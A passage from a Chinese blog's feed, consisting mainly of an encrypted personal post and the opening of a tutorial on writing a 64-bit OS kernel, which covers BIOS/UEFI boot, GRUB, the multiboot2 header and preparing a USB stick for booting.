d22faf1f2550f8407bf6f54cec5632960e1cdbddd1a23d421e0beb435ab6d49915926b92f1bec815cb684d369e101eb318d0f5165b2afbdd719c0336f123266b3d3a25637004b8bdd08413991753f994bebb429233e51d0ddb9f71cf5a83de0e25d8a3226d28d162a61899c721e6dc937b4c6e53fa637f983f23a286b91d8c1ee7d09473e4630d4ad447f6922c8b2b3bdf9b622f48b92e60dfbf88a1220548fdc63be50b1fd5f8bc083109a6f8e79bfe7c73bdae2637d205ed39c8c25a86e6bfd86e487b112060313f595bae7b65131be6c64dcf8cbafd16cc0257b5607e7c5c782e9726e76ee200b9f20c7f76933ca459662df48ac5bcdd2a73b0ca61dd4bf2e5e50b7909414ebc93e7b16ef4b0428af8e1d931c09a0436a74ceac58be04c322b10bd43d76df00bb32622472a4650f9cbd1193847fd77e355a0c29e2e12864b95c6ceb6eef869a18cf05b4df70b6f6f8ed8f0273a12940e3588f1e39fa74c9a0aef69ec3290cbf28ed2dd157e19d0796da785f3fc9e9718a9082204dfef16dd6e9f01d345149752eaff547ca6d4f60164a31d72665c2ad92939931cebc6a6b21633d11f2457071544392b4236ae1a2deabf498d7e882397d405a0bef0bcf04e65f8e7bbc279d0e949d805ee197cfe25d93ce5ed55262d67080b8600ac8ec60bed29f9982577fc551e4d889aa89593282aea9231eb21ce1b2d44ff349df2057614d5687401330cbd6353f7bb3b31c18c65270d627035c32a9a3cf32af73f6a36386778def66b72779dab9e692466659fd5556c76d03b7b09f46488c93a6cb598f68962a54905221fc4d866eeb20fc696520e3390663a858b4904ec3271979aab6e97f84b3c73afe1506e2d26ae4114bfd787d1a8cade2ac23cd48a32144df8763b7ea8552051c57f103fbafafed3fa1fd9c64c2f6050567372efa101774ba2fb0c5369edef2710e90b984f9df459c7dcf82483cbd6b66df1ad3ea5be1c13fcece81735ed7a860698f04a50736d2514ff88e836ae343c1f054b439c7d86db28f7f7e46fe0f085da52038ec510c3f74be1a0edda4310c53e631e74b8eacd84bc872ed8aaf7968b297f7dcbe04ddfdf620cdf4503bbbbfbe437735fdfa65bc96b57275161ce58a363d1086ac45e1f0fa7c3cab60cd44e514393b39c8fc0bf1c8c3467af750caab653a2c2ee69872b3dbc3a688881e2bd9b63599cce7965108a7868da71772cf8b980fa3f4e6133d87807ffde5b06a0d7e555d8ccbc3cf217a8e5c0b5027830c9a6363a3e3d7f37f0f8b33fd6780c412dde722de2f9bfdf7d17606a32c2f0cfd12962ce04a1864a60024dd68723c50ac5a370d490dd164e021deaf90494a58892b63452044872b45c9236d8cbe0b30f819dd9318b62ae23bf5d82740043a421eef25e72edabd4ba6c95ad37ecd22dab91c988d27bbd12491091f5f57931aae0dac73b19090cd35b859034beb5b017e0583751ca14c7f4d0f7034f7519b77200517912c2507c8bce92e48fa6db0ae10aab9ea0b45dbfd0a0772d619ffccefc0cfc253fed5389fc7823df44d67c92ebf31c88fdd134347342c82eacd63e7aafdc1be76cc1f79339f5caf6c790796f9555756615400183bda6d289cda2d0837b31f4b9c03f049c6e54dcedc8fc82041eed1224872e557e743abd0490cb8ff8c61ab34fe3e8180ad93f69f3bf30c463eaa3bd30fef4831dd4a78081a7553050f3d9e1f5fabf1c0293a1c9eef267ce7baa1af290e7bc078723f157a4846da819d95a1cbe300915d42a7369d30a8229cf5c4b563b05053da25f388874c94b86e13697ef0df3773e40feb5aa83e0604a817596b6ad54071532ef000659ead962df4938b1af394785987d7ca782696929eb3569ecc206dcd4b20597189ac3ca49f92e6915a8407bb236a4cf0dca51b0f918c0017e1da72ae7f2153d331c2545c06460d915b420da20fda3c3428dba2a8b09dc0ffcf2d20641b4dc8cd89a2705a9a8ef56dba861af611d69648691c73b6c15d2044be5c3776cfdb2d98125f138032beed3ed956381ff8a69ebe219ffa4b21531eb5b211e141e0083ce7f4f4dac5171e94e20b654f6203b36d2df03c6072ef25ca89e82ca263b8e55ff28c83f0dfcdaa34be066a781b610edaba730465af2a6daa0084bce089f36df6f05a95cf6febfb7bfd737f4399c50f2b85ab02d2028707972462a038e0ce0fdca22a156f3eed49b09e37db260f4a6cc9d2a1a1b45a9f51a31b21a4e8a9a67b1ea8c90b13800e8c06aba47a3ddff8f4cd78780db6cc68941a147c53e556c52381e266559ad50a15cf27e25ddec3af43819f77c705d9180ca22c525295ffd83bb6d90bcbb78e102b6f21065f930012deb10bd70c11d70bf9052b8e1446e5758ac3cefdc46c103b7d908f17ccb2b8373e6bc9330985b8d6876769c419aa6d3c11b17a928000adbfbe4fcf0e7946381d39e07014cc118d2eb4578b66d9ccfcbb3db757f3c76cd6402f4209c978e4335e43d9037f1527e62936956d58e6cbc79875e79bf621f70158d4f7d4a320e629d9c70b523be6e85ce0dd561e3fe0cca1ca1b3acdf25e2981bd69d33e9e69dd207af88db529b343004f01ff106ae7b5c29b751e6f9f1ff2f867d301a09a72c6be53c5b8182b3c24c870fdcb0d67199a117dd0b46abcaff68bbe3dcbc05ec6a3beb478b806b1373e672c1bac9789077870cbd5ccc3f2a4fbe77b02d5b4852e2d7a94591188dd876a1bdb4c393b32128814326d414c24562bf2700910b8027e20339188cf3b87c3f4209cd516374bf8ed1983e801fb2a70d26f280c979de97b8cd4d5cb680f1507a07e0ab6ab7c5716bd285109dc86fde72109b0067e11f09bb466f87fa8bdda123fdf466325c0d3fb832b9c921c4b0dc4faf2e209b3b47a5265b555d9d6bfef2174007b2dbc5e4493052c651fef84a5b9faeded0e10f57d507bbddaa2af67c8d34e4e93113bd337324e64ffcdcf05f05c2effaba6d3119b89ce260e936521f2a510409f97e19bb00befdec21655f9e7b953cb6daf0360b4629bcc1ed3ccc838caef01174cc7d92811860bccd2e8e9cb64a19dcde535a340d2cca3a3546d41f7c0a0ae02e56387293d68552e3492b74e428503ee279482ef91a38f6a40e2f595df4de30bc201c4f644f67515d21640665f55a6e505546329137aafb73861d3790239c963a600649ff13cc93b84fd6644854911238c699e9ab48d0d5be1c7e38f12b8e3f71cd4acdc20c2bac336b3a025366b680f9f1996ebbbe4846e4f49b2912025cdf761a4fda18935d7c3e49f6eb4fa5fe99dcff677471e9c60838818a10457ba1abadd9041910a65f7622fc8e9cd57b48ea61481c0cb13817c998c952fe9e0c7de69d7cc58eb34747f0c1b88b542b0a5ad3cc160f3ee8385026fb419b16aa7ec872626e6b9536824f25ce29d9695fef1c2fe2967d275e76d222d3c96a71d8bb55c3052bc0d49f10b7b3f6b31ae2b32088c7bcb439902aade019ccad80033227bc78120e85bd4b84d85b2e3e856e1ad6aad7627582a9fa2f8b41876f5bbe0249aedb961e07386a44bfbb73f189dcc339c5418248e4102b05e942ede1efe599fb416545046e0755ba78d2bb036d44134290129149935a16d91fdc950dd59dd2a6ad222f79718c494f69beb5954ad9a7bea78a1bb8c2a0c43c85cbf4f065942a7ca640ccf8edb66d7a2e76cf00f20cb82432616b39fd421edcb78ec9fae156adb5ee555db976df1ee07081fe135af751e11d82959f3b5b837c379714e1c59d237068f12754eb62034e802b7a7fe845775ee11c491a15b7b85c5d7b01e2d4e9423e068e105d80332c4231ceb3a88b5095e73793a4e2844600fe6ce8834e8e9853c7793f32c174ec97a402b13982dd4681318e59ec8660f4afb668c780a43ccb1b0be3d94fa9c3b8226b594c33c2bc6217ab94c1b8be2756d47ffdc2971383fafd4a5f277b21325379fae7a9d76bd01341bb8d7ffaec51519c33ac0dd38bbc32a5be607b2b679c9bb934d694256e867ff388de9204d7735af875e2c4f1e2a2a301b01d6fbbe56a2cad44701140bbb69c649ec6a0e5387d7b1286ccfb4a874521c1e74e37117e5c5fb146a624c76f14e2acffe02fdad0819da86db68bdcd525f13389dcb172e2cd8ee3c638e6c4d256b32082b4f254b284ec8650a8f4ac7db361359a25bff7be7e7d40690c3fcc29bac81bca180b634a7bbda6275ec251ecd380050985b862bd42bd6063e91ea1f84960400eebb6011ab040d700933c46c7165d87e77c40cc8edc2a7fb8b861ebe2fdffb8de6dfcabc7dea9c3effca58f86e4ae73c72fbccaf8126607ebff383eab53726155eeb2d87399c7b3d2525b179d52b577d834299fbe0c25ac7af0a69c834c01202e1e6a9c1a19f687f402a76ee70a51724a2863c0ee37863c691db559555a2d775116806a04dc8154324fb650766ae8ced350f7b297380f0f2d67d989740040da46c0d3a380827def1acba8d0b6dd411cd448a68d7f59da3496121653b468fe2690179a85ce155c6eccee97699c478f1e1aaa4bb13dc0eb1b9d7bb0d067e55705ec06cded191922eb8428dc878a7307eb30d2855cc78ba6b969ff8f9f26bd940a89a1ac26a75324f7dc63deabf39dda8b8bd27b94c2f83a275aa102e6312b42b94a329b69deff8de8e70b97a5bfbbae626b5f448e0d78ce141f4461fab68db0f6c13b5d47074cf63ea14b1da0931bd3e4c352e2aee91e7773234d0db1939882c08660d1442ae74a810c0bcdbdd6e87bf04a4a70fac45344b5993fcd2a32459c29e5e3c905b0cf07907c56607629ea592c118e9db191e966f4e7c8ddbfc765c2f306f5498d5b7450072204a9a93155f1f18e39ea1a0c12223050350850e7810b8369ff6ef0dc987073fa343dd37615f687c87d10a5289f42066d410a9e2a4011c10083ea6c7e2dca865aa236ec52ad02af609c9562225db64590dbb1ea7f25b2d4d3a860c5b3403ceb33c164886d30da546ef70c236cd44319e3c65c18836c3d0e83af3a305d7a2de28f34beadfcbf69cdf3aa558d680369825a8ee4f37d77e441748f16e6a24a49707196c6e92b7519d4ebde6648ffff196a107b7e8ea4904f05d804c78c59bc159ec5b457bfde93a195e66802b734138d120af02f0f183998e8977449dd99fd3565a96865ccce01207fbb52619eff6146743824109cc27ca7fda365fd8f78084dc1b1d45bd101d481dea664877d098b9057b659b2a28552ea347e52ac63a4c3c89ded9bec0d41f072de229f83e1cab8935b2aacc7b3b08d78fdd8a1cce527e5b6d95261908960638e9157dca8b414d4ce10832f36bf5d1c56de40e9b414dde0f5b027501d2385231a1b31eaf7f0dc726ba240c3def96818e776937dcdaf97105ddfd83c8df71a6c5fad09fa062748c18a6f296101c3e51837a92350504e1b82457a48e259bbc83933bda51c96f67ab623f88ca06caff1b3c34078c763a6fe08af2ea9914c06fd6536504d6ae0d427ead76dff0e8e00415f7f18179149b120eee196a281b1c181b25964d33a8647ba9c845487bc9ce484d89ab61d990125648e9df470ac1febbb662f8bb3200b830c3322a448e3d0067aba53b5e4e64f04aff848d8e4feb3b5cb01f9bb67bb172c1b46d385a74d7e2dc54ce8dd8de09ac07f69996942158b384687cf80e63e6140782c44702851f8e05fc84b9bd3731ab289f405239ac8257140afcbd861197d6940a5bf2612520bdfe9ab39a0b074fb7148c68b4327df788499bc85fb979d1b5cbddcfb98105c9ecb2ab845cfff8ae63c8c9c021a4f5301087a02a83fd9d9af2c21ee5fc9e3f40085bb4deaa46e41e2d50a1b9123d550d8524e500ac0cd03e4271ccbd09277be7e62e76d5e15b418b477f0121191b6881d01b09206d6cfb0a361db54cd9d9fa17e0bdada825266b9604f447523b10fbdcb5f98f34123a7e61b9d2b73728157169baed6f291d4d7065377a21475a3f96060c3facdbffea7792fe4ef86758a6829b4b325bfc7c18390f2c215d6ee74292544152cbc6e99b05cbdfa5cd53912fc83fbc7bc7ed723c6a70da9796831b631f184e6ab8eec3b95e8c51b8054da3f1208a42b48a2097f05b783fee442f2adc2f26edd400e93a6133f10a4e4be03f8adf01f6f97f063590e663b22308d9a3bfa7ae8df656e422ce029a426eaa230e19b2bc97d08810134758333c11580bb3ca4dcfd490d33e0aa655b58b0e2baf896e8ee31f7fa6918a3619b2b13b507b7c3645ee9b0020cefb4c4e8dd658a6601073b008e5e7ba52cd65bb69425c30c1fad520a0c673f11af6254023af245b3c07b7049eb4f186daed5a5a3a6917c84125c49f2dcfac3239e98d4774ee89da93d0259720c8dc523597b07e1c7480d891b641d2d6d777c4c83024f02b469cc5bb039940d83878b44a568f5833b0d4ec43358394d268be73321c8c52dc575a84dc67ab09028a33bf7b1bd2cc43c4e9dc5cfcefc242f49c013b1a15469d74cc8d6fa5cdf6393bc65307ea703baebcde839fe9d3f9322b9199fe21c8e0e7525e587d662e5c330f269b1fd76d613103559c030e756e6f5cecfef9d6376e00c93ba791d86bc1d508b4f602bf72352</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">题目还没出好所以暂且请等待</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">为什么要让我忘记呢 我们以前感情明明那么好 大家每天在一起都很开心 结果现在各奔东西什么的这太奇怪了 你不是说乐团是命运共同体吗 求求你 我想让crychic重新开始 我想找回大家那段快乐的日子 crychic没有结束 我一直为了它在努力着 等一下 不要走 我真的很喜欢大家很重视大家 求求你 ‍♀️要我怎么做你们才肯回来 ‍♀️只要是我能做的我什么都愿意做 ‍♀️我真的</summary>
    
    
    
    <category term="PIECES" scheme="https://arttnba3.github.io/categories/PIECES/"/>
    
    
    <category term="碎碎念" scheme="https://arttnba3.github.io/tags/%E7%A2%8E%E7%A2%8E%E5%BF%B5/"/>
    
  </entry>
  
  <entry>
    <title>【CODE.0x03】现代 64 位 OS 开发手记 I：UEFI 启动、GRUB 引导、Frame buffer 文字输出</title>
    <link href="https://arttnba3.github.io/2023/11/29/CODE-0X03-OSDEV64-I_UEFI-GRUB/"/>
    <id>https://arttnba3.github.io/2023/11/29/CODE-0X03-OSDEV64-I_UEFI-GRUB/</id>
    <published>2023-11-29T12:21:47.000Z</published>
    <updated>2023-12-12T07:11:42.220Z</updated>
    
    <content type="html"><![CDATA[<p>遥遥领先！遥遥领先！遥遥领先！</p><span id="more"></span><h1 id="0x00-一切开始之前"><a href="#0x00-一切开始之前" class="headerlink" title="0x00.一切开始之前"></a>0x00.一切开始之前</h1><p>很久以前在知乎上曾经有过一个“程序员的三大浪漫”的讲法：「编译原理」、「操作系统」、「图形学」——当然这个似乎是某些知名答主杜撰的并没有任何的由头神必说法，笔者自己也不认为所谓的“程序员的浪漫”就仅是这几个东西，但对于笔者而言，“自己动手编写一个可以正常运行的操作系统”确乎是一件<strong>非常炫酷的事情</strong></p><p>笔者此前在大二下学期的时候曾参照《操作系统真象还原》编写过一个非常简陋的只有打印功能的 32 位操作系统——严格来说笔者仅仅完成了一个高度客制化的 boot loader 加上一点点的 kernel（因为懒而不是时间不够，天天摆烂躺平打游戏😥），也没有在真机上测试过，完全算不上一个能用的操作系统；在大三寒假期间笔者花了将近一周的时间<a href="https://arttnba3.cn/2022/02/21/EXPR-0X00-MIT_6_828/">刷完了 MIT 6.828 的前四个 lab</a>，但那严格意义上来说也并不是笔者从零开始写的一个内核——大框架基本都是 MIT 搭好的，笔者仅仅只用补足非常微小的一部分；在大三下学期笔者想与曾经喜欢过的妹子一起参加一个<a href="https://os.educg.net/">写操作系统内核的比赛</a>，但是由于<a href="https://arttnba3.cn/2022/10/28/PIECES-0X04-SHELL_OUTSIDE-4-XIANG_WAN/">一些缘故</a>笔者一直拖到了比赛结束都还没有开始动手写第一行代码，最后也就不了了之了；在大四上学期笔者又重新写了一个<a href="https://github.com/arttnba3/SumiOS">用 Grub2 引导的 64 位内核</a>，但是写完内存分配之后也烂尾了 😅</p><blockquote><p>仔细想来对于笔者来说似乎很少存在“万事开头难”的阶段，但往往一切事物都会滑向无底的大坑永久无法填上：）</p></blockquote><p>因此趁着现在时间尚且充足，笔者想要<strong>真正地从零写一个可用的 64 位操作系统内核</strong>，算是满足自己多年来的一个梦想吧，名字的话笔者决定叫 <code>ClosureOS</code> ——这个名字的由来比较简单，笔者一直很难想出比较好听的名字，看了看市面上有各种操作系统都叫 <code>Open*</code> ，那笔者就叫 <code>Close</code> 好了，但是 <code>Close</code> 这个单词长得又不好看，于是笔者最终选择了 <code>Closure</code> 作为这个操作系统的名字——虽然似乎不是特别好听，但反正是否能写完都还是个未知数，所以也无所谓了（笑）</p><p>本项目代码开源在 <a href="https://github.com/arttnba3/ClosureOS">https://github.com/arttnba3/ClosureOS</a></p><h1 id="0x01-Boot-Firmware"><a href="#0x01-Boot-Firmware" class="headerlink" title="0x01. Boot Firmware"></a>0x01. Boot Firmware</h1><p>现代计算机的上电过程比较复杂，不过对于操作系统开发而言我们其实只需要关注<strong>当我们按下开机键之后所发生的事情</strong>，实际上无论是古老的 Legacy BIOS 启动还是逐渐成为主流的 UEFI 启动而言，其不外乎都遵循以下三个大阶段：</p><ul><li><strong>ROM Stage</strong>：经历了一些基本的初始化工作后 CPU 被重置，主核心被唤醒，指令指针寄存器指向 <code>reset vector</code>（固件入口点）并由此开始执行，此时尚未进行内存探测，需要直接在 ROM 上执行</li><li><strong>RAM Stage</strong>：内存探测完成，此时可以进行主板上各芯片组、CPU 等模块的初始化等工作</li><li><strong>Boot Stage</strong>：找到启动设备，完成启动设备前的依赖项的准备，将控制权移交给设备上的下一阶段的启动器</li></ul><p>现有的固件通常分为两类：BIOS 与 UEFI</p><h2 id="Legacy-BIOS"><a href="#Legacy-BIOS" class="headerlink" title="Legacy BIOS"></a>Legacy BIOS</h2><p><strong>基本输入输出系统</strong>（<strong>Basic Input&#x2F;Output System</strong>，BIOS）是用来为计算机提供初始化服务与运行时服务的一组固件，其被预装在主板的 ROM&#x2F;FLASH 芯片上，不同的 BIOS 通常仅能在特定的主板型号上运行</p><p>当计算机启动后 BIOS 为第一个被运行的软件，此时计算机处于实模式下，仅能访问 1MB 内存的空间，其中物理内存 <code>0xF0000 ~ 0xFFFFF</code> 这 64KB 空间被映射到 BIOS ROM 当中，并以 <code>0xFFFF0</code> 处作为 BIOS 程序的入口点开始执行</p><blockquote><p>对于支持且开启了 BIOS shadowing 特性的计算机而言，BIOS 会被先从固件当中拷贝到内存中，而非直接在 ROM 空间上执行</p></blockquote><p>BIOS 会从南桥的 CMOS 芯片中读取 BIOS 程序的设置值、硬件参数侦测值等信息，在完成加电自检、设备测试等工作之后，会从启动设备中读取第一个扇区到物理内存 <code>0x7c00</code> 的位置，该扇区被称为<strong>主引导记录</strong>（<strong>Master Boot Recode</strong>，MBR），随后 BIOS 会跳转到 <code>0x7c00</code> 处继续执行，控制权转交给 MBR</p><p>MBR 的结构如下图所示，其中<strong>不仅包含有 440 字节的第一阶段引导代码，同时还包含有磁盘的分区表信息</strong>，MBR 以末尾的两个字符 <code>0x55, 0xaa</code> 作为其标识：</p><blockquote><p>这里我们可以看到 MBR 分区表仅支持不超过四个主分区，多余的分区则需要依赖操作系统在其上建立虚拟分区，此外 MBR 也不支持管理硬盘 2TB 以外的存储空间，因此这种分区方式 <em>其实已经正在逐渐地被淘汰</em> </p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231113212038.png"></p><p>由于 MBR 仅有 512 字节，无法完成过多的任务，因此通常的设计是由 MBR 从硬盘上读取第二阶段的 boot loader，由其来完成后续的系统环境初始化、载入操作系统内核等工作</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231113211739.png"></p><h2 id="Unified-Extensible-Firmware-Interface"><a href="#Unified-Extensible-Firmware-Interface" class="headerlink" title="Unified Extensible Firmware Interface"></a>Unified Extensible Firmware Interface</h2><p><strong>统一可扩展固件接口</strong>（<strong>Unified Extensible Firmware Interface</strong>，UEFI）为一套<strong>固件接口规范，用以初始化硬件、引导操作系统，并向操作系统提供一套统一的功能接口，解决不同厂牌 BIOS 分裂的现状</strong>，其最初起源于 Intel 开发的 EFI，在 2005 年由 Intel 交由 UEFI 论坛进行推广，<strong>UEFI 固件本质上与 BIOS 固件没有区别</strong>（都是封装在 ROM&#x2F;FLASH 固件里的程序）</p><blockquote><p>例如 BIOS 厂商 A 提供的某个功能接口的使用方式是 X，BIOS 厂商 B 提供的相似功能接口使用方式是 Y，那操作系统就得为不同厂商的不同功能编写多套代码</p><p>而有了 UEFI 规范，厂商 A、B 的 UEFI 固件都需要向上层提供统一的接口，从而使得操作系统可以用相同的方式调用某个功能，避免了代码分裂的情况</p></blockquote><p>这里引用一张非常经典的图片简述 UEFI 启动的基本过程：</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231113191232.png"></p><p>相应地，UEFI 启动不再使用老旧的 MBR 分区表，而是使用 <strong>GUID Partion Table</strong> （GPT 分区表），以 512 字节为单位作为一个<strong>逻辑块</strong>（Logic Block，相对应的区块地址便称为 LBA），前 34 个 LBA 用来记录分区信息，其中 LBA0 为了兼容性保留给 MBR 使用，LBA1 记录分区表自身的信息、备份用 GPT 分区（最后 34 个 LBA 的位置）、分区的 CRC 校验码等，LBA2 ~ LBA 33 则用来记录分区信息，每个 LBA 可以记录四个条目：</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231129220808.png"></p><blockquote><h4 id="扩展阅读：兼容支持模块（Compatibility-Support-Module）"><a href="#扩展阅读：兼容支持模块（Compatibility-Support-Module）" class="headerlink" title="扩展阅读：兼容支持模块（Compatibility Support Module）"></a>扩展阅读：兼容支持模块（Compatibility Support Module）</h4><p>在 UEFI 逐渐替换掉计算机底层固件的风潮涌动之时，尚有大量的设备仍旧使用传统的 MBR 分区表，为了进行兼容，CSM 这一兼容支持模块会模拟传统 BIOS 的功能，为这些设备系统按照传统的 BIOS + MBR 方式进行引导，并提供传统 BIOS 的 0x10 等中断服务</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231129203153.png"></p></blockquote><h2 id="Coreboot"><a href="#Coreboot" class="headerlink" title="Coreboot"></a><em>Coreboot</em></h2><p><strong>Coreboot</strong> 起源于 <strong>LinuxBIOS</strong>，最初的思路是 <em>既然 Linux 有比较好的硬件支持，那计算机启动以后直接跳 Linux就完事了</em>  ， 于是 <em>使用 20 行汇编完成初始化并将 Flash 中的 Linux 拷贝至内存后直接跳过去</em> 的 LinuxBIOS 诞生于 1999年，随后经过不断发展，引导 Linux 所用的程序越来越大，于是项目在 2008 年改名为 coreboot，项目结构变为 <code>coreboot + payload</code>，Linux 则成为了 <em>可选的一段 payload</em> ，通过这样的模式，Coreboot 可以通过引入不同的 payload 来支持多种不同的启动规范，包括 Legacy BIOS 和 UEFI</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231129222934.png"></p><blockquote><p>目前市面上正在使用 Coreboot 的主流产品有 Google Chromebook 和 System76 旗下的笔记本等</p></blockquote><h1 id="0x02-多重引导规范-amp-GNU-GRUB"><a href="#0x02-多重引导规范-amp-GNU-GRUB" class="headerlink" title="0x02. 多重引导规范 &amp; GNU GRUB"></a>0x02. 多重引导规范 &amp; GNU GRUB</h1><h2 id="Why-GRUB？"><a href="#Why-GRUB？" class="headerlink" title="Why GRUB？"></a>Why GRUB？</h2><p>现今的大部分所谓“教你自行编写操作系统”的无论是教程也好书籍也好，都存在着一个小小的问题：<strong>对 Legacy BIOS 的内核引导阶段大书特书</strong>——诚然，了解一台计算机从启动开始到内核真正运作这段期间的实现细节无疑是十分重要的一件事情，对于操作系统学习而言或许也有不小的帮助，但很容易让初学者陷入到与各种硬件博弈的苦战当中，同时对于实际的开发而言手动编写一个<strong>仅适用于我们自己的内核</strong>的客制化 <code>MBR + boot loader</code> 意义并不算特别大</p><blockquote><p> <del>再说都什么时代了还在用 Legacy BIOS，Wintel 联盟都宣布这玩意已经彻底成为历史了，👴🚪就没有必要再深究了，大概了解一下差不多得了</del></p></blockquote><p>而 UEFI 规范虽然给了我们更为方便地通过 UEFI 的各种接口实现不同的功能，但<strong>UEFI 的大部分功能在 Runtime 阶段是不可用的</strong>，同时这也少不了编写设备识别、文件系统解析等工作，再配上编写各种基础设施，一套写下来一个EFI 程序其实差不多就已经是一个完整的小内核了——当然， <em>直接用 EFI 程序作为操作系统内核不是不行，看着也确实像个样子</em> ，<strong>就是不太优雅，也不太现代</strong></p><p>因此，对于内核引导阶段，我们暂时选择<strong>直接复用现有的成熟的方案</strong>——例如「GNU GRUB」，其同时支持 Legacy BIOS 与 UEFI 引导，让我们不用在一开始就陷入到与各种存储设备斗争的泥潭当中</p><p><img src="https://s2.loli.net/2022/09/07/eTCVOtlpE7PYFXq.png" alt="image.png"></p><blockquote><p>当然，如果说仅从「学习」的角度而言自己亲手写一个 <code>MBR + boot loader</code> &#x2F; <code>EFI</code> 并亲身体会到其载入内核的整个过程其实是一件非常有益处的事情（笑）</p><blockquote><p>先挖个坑：我们将在操作系统内核开发完成之后的后续补充文章中<strong>自行开发一个 EFI 程序以引导符合 multiboot2 规范的内核</strong></p></blockquote></blockquote><blockquote><p>也有人会问：那为什么不用 <a href="https://github.com/limine-bootloader/limine">Limine</a> 或是 <a href="https://gitlab.com/bztsrc/bootboot">BOOTBOOT</a> 这样更加现代的 boot loader 呢？一个原因就是因为 GRUB 相对有着更好的兼容性，能够在更多设备上运行，教程资料也比较多</p></blockquote><h2 id="Multiboot2-规范"><a href="#Multiboot2-规范" class="headerlink" title="Multiboot2 规范"></a>Multiboot2 规范</h2><p>那么我们如何让 GNU GRUB 知道他该怎么引导一个什么样的内核呢？答案是通过<a href="https://www.gnu.org/software/grub/manual/multiboot/multiboot.html">多重引导规范</a>（Multiboot Specification），该规范制定的目的是使得遵循该规范的操作系统可以被同样遵循该规范的 boot loader 引导，而无需编写特定于 OS 的 boot loader</p><p>GNU GRUB 第二版进行了完全的重写，多重引导规范也有个<a href="https://www.gnu.org/software/grub/manual/multiboot2/multiboot.html">第二版</a>，不过好在 GRUB2 同时支持两版引导规范——这里我们使用<strong>第二版</strong>的规范</p><blockquote><p>然而 Linux kernel 使用的<strong>并不是 multiboot  规范</strong>，而是其<a href="https://www.kernel.org/doc/Documentation/x86/boot.txt">自定义的协议</a></p></blockquote><p>多重引导规范要求我们的内核映像的前 <code>32768</code> 字节中一个任意的 <strong>64位对齐的位置</strong> 必须要有一个 <a href="https://www.gnu.org/software/grub/manual/multiboot2/multiboot.html#Header-layout"><code>multiboot2 header</code></a> 来记录相应的信息，格式如下：</p><table><thead><tr><th>Offset</th><th>Type</th><th>Field Name</th><th>Note</th></tr></thead><tbody><tr><td>0</td><td>u32</td><td>magic</td><td>required</td></tr><tr><td>4</td><td>u32</td><td>architecture</td><td>required</td></tr><tr><td>8</td><td>u32</td><td>header_length</td><td>required</td></tr><tr><td>12</td><td>u32</td><td>checksum</td><td>required</td></tr><tr><td>16-XX</td><td></td><td>tags</td><td>required</td></tr></tbody></table><ul><li><p><code>magic</code>：multiboot2 header 的标识，必须为 <code>0xE85250D6</code></p></li><li><p><code>architecture</code>：标识指令集架构，0 表示 32 位 i386 保护模式，4 表示 32 位 MIPS</p></li><li><p><code>header_length</code> ：包含 tags 在内的整个 multiboot2 header 的大小</p></li><li><p><code>checksum</code>：该域与前三个域相加的和为无符号 0</p></li><li><p><code>tags</code>：补充域，其格式通常如下，以类似数组的形式跟在后边，<strong>每个 tag 的起始地址8 字节对齐</strong>，<strong>整个 tag 数组以一个 type 为 0 及 size 为 8 的 tag 结尾</strong>，关于不同类型的 tag 格式，参见<a href="https://www.gnu.org/software/grub/manual/multiboot2/multiboot.html#Header-tags">此处</a>：</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">        +-------------------+<br>u16     |<span class="hljs-string"> type              </span>|<br>u16     |<span class="hljs-string"> flags             </span>|<br>u32     |<span class="hljs-string"> size              </span>|<br>        +-------------------+<br></code></pre></td></tr></table></figure></li></ul><h2 id="在-U-盘上安装-GRUB2"><a href="#在-U-盘上安装-GRUB2" class="headerlink" title="在 U 盘上安装 GRUB2"></a>在 U 盘上安装 GRUB2</h2><p>虽然很多操作系统编写教程都是在虚拟机当中运行的，毕竟 <em>对于操作系统初学者而言更重要的是了解整个操作系统的运行机理</em> ，但是<strong>在物理机上运行自己写的操作系统是非常令人感到愉悦的一件事情</strong>，所以这里我们将会介绍如何在 U 盘上安装 GRUB 来引导自己的操作系统内核</p><blockquote><p>如果你不想弄这一部分，也可以跳转到下一节，直接开始安全地使用 QEMU，我们后面的各种开发调试其实主要也是在 QEMU 上完成的 ：）</p></blockquote><ul><li><p>如果你在物理机上使用 Linux 作业系统，请找到你的 U 盘对应的设备节点，如果你的计算机仅有一块固态硬盘，则新插入的 U 盘 <em>通常</em> 是 <code>/dev/sda</code></p></li><li><p>如果你在物理机上使用 Windows 操作系统，出于易用性考虑，请在 Vmware 虚拟机中安装一个 Ubuntu 操作系统，并通过如下方式将 U 盘连接到虚拟机中（请先确定好你的 U 盘对应的设备名称），在你的虚拟机处在默认配置且不存在外部存储设备的情况下，U 盘对应的设备节点通常是 <code>/dev/sdb</code>：</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231114214055.png"></p><blockquote><p> 也可以通过重新拔插可移动设备以让 Vmware 自行截获：</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231114214205.png"></p><p>如果你是其他情况，请自行进行判断 ：)</p></blockquote><p>首先安装一些依赖：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt install -y dosfstools mtools gparted gcc cmake git bison libopts25 libselinux1-dev m4 help2man libopts25-dev flex libfont-freetype-perl automake make autotools-dev autopoint libfreetype6-dev texinfo python3 autogen autoconf libtool libfuse3-3 unifont gettext binutils pkg-config liblzma5 libdevmapper-dev</span><br></code></pre></td></tr></table></figure><p>接下来我们对 U 